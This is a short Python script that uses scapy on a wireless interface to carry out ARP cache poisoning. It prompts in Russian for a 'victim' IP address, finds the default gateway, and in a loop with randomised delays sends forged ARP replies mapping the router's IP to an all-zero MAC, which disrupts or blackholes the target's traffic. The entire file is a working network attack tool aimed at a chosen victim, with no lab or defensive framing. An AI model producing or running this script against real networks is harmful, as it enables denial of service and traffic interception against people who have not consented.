import time
import random

import scapy.all as scapy
scapy.conf.iface = "wlan0"


def poison(target, router, targetMAC):
    # Ethernet layer with destination MAC and source MAC
    ether = scapy.Ether(dst=targetMAC)
    arp_reply = scapy.ARP(pdst=target, hwdst=targetMAC, psrc=router, hwsrc=FAKE_MAC, op=2)
    packet = ether/arp_reply  # Combine Ethernet and ARP layers
    scapy.send(packet, verbose=0)

FAKE_MAC = "00:00:00:00:00:00"
target = input('Введите ip адрес жертвы (пример: X.X.X.X): ')
router = scapy.conf.route.route("0.0.0.0")[2]


while True:
    targetMAC = scapy.getmacbyip(target)
    routerMAC = scapy.getmacbyip(router)

    if targetMAC is None or routerMAC is None:
        print("[!] Could not resolve MAC addresses. Exiting.")
        break  # Or handle the error in a more robust way (retry, etc.)

    targetMAC = str(targetMAC)
    routerMAC = str(routerMAC)

    print("[ARP] -", targetMAC, routerMAC)
    poison(target, router, targetMAC)
    #poison(router, target, routerMAC) #Commented out for simplicity and to avoid unintentional poisoning of the router
    time.sleep(random.uniform(0.3, 1.7))
